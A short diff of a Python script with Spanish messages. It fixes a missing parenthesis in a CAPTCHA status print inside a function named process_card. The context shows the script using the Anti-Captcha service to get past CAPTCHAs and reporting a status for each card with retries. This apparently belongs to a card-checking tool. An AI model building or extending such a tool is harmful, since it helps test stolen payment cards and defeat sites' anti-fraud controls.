@@ -234,7 +234,7 @@ async def process_card(card: str) -> str:
             if g_response:
                 print("✅ CAPTCHA resuelto correctamente")
             else:
-                print("❌ No se pudo resolver el CAPTCHA"
+                print("❌ No se pudo resolver el CAPTCHA")
                         # 2. Esperar que Anti-Captcha resuelva el captcha
                 
             
@@ -430,6 +430,7 @@ async def process_card(card: str) -> str:
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
 
 
 
